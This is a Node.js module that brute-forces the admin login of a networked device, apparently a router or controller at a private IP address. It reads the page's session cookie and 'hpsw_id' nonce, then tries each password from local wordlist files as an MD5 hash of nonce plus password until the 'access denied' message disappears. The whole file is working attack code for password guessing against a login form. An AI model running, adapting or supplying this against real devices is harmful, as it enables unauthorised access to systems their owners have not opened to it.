const axios = require('axios');
const cheerio = require('cheerio');
const path = require('path');
const { getWordlistFiles, getWordlistValues } = require('./fileUtils');
const { md5 } = require('./hash');

const url = 'http://192.168.15.10/';
let cookie = '';
let hpswIdValue = '';

// Function to send a GET request and capture the hpsw_id value and the cookie
const getHpswId = async () => {
  try {
    const config = {
      headers: {}
    };

    // Add the cookie to the headers if available
    if (cookie) {
      config.headers['Cookie'] = cookie;
    }

    // Send GET request
    const response = await axios.get(url, config);

    // Check if there are cookies in the response and capture them
    if (response.headers['set-cookie']) {
      cookie = response.headers['set-cookie'][0];
      console.log(`Cookie: ${cookie}`)
    }

    // Parse HTML and capture the hpsw_id value
    const $ = cheerio.load(response.data);
    hpswIdValue = $('#hpsw_id').val();
    if (!hpswIdValue) {
      console.log('No hpsw_id, target not applicable, response:')
      console.log(response.data)
      return
    }

    // Get all .txt files from wordlists directory
    const wordlistFiles = getWordlistFiles('./wordlists');

    // Iterate over each wordlist file
    for (const file of wordlistFiles) {
      console.log(`Checking file: ${file}`);
      const wordlist = getWordlistValues(path.join('./wordlists', file));

      // Iterate over each password in the wordlist and test it
      for (const password of wordlist) {
        const hashedValue = doHash(hpswIdValue, password);
        const success = await sendPostRequest(hashedValue, password, file);
        if (success) return;  // Stop if the password is correct
      }
    }

  } catch (error) {
    console.error('Error:', error);
  }
};

// Function to send a POST request
const sendPostRequest = async (hashedValue, password, file) => {
  try {
    const config = {
      headers: {
        'Cookie': cookie,
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    };

    const data = `q=&pA=${hashedValue}`;

    const response = await axios.post(url, data, config);

    // Parse HTML and check for error div
    const $ = cheerio.load(response.data);
    const errorDiv = $('div.e:contains("Controller access denied")');

    let result = errorDiv.length > 0 ? 'Controller access denied' : 'Access granted';
    if (result === 'Access granted')
      console.log(`File: ${file}, Password: ${password}, Result: ${result}`);

    // Return true if access is granted, false otherwise
    return result === 'Access granted';

  } catch (error) {
    console.error(`POST Error for password ${password} in file ${file}:`, error);
    return false;
  }
};

// DoHash function that combines hpsw_id and password from wordlist.txt and then hashes the result
const doHash = (hpsw, psw) => {
  const nonce = hpsw;
  return md5(nonce.concat(psw));
};

module.exports = {
  getHpswId,
  sendPostRequest,
  doHash,
};
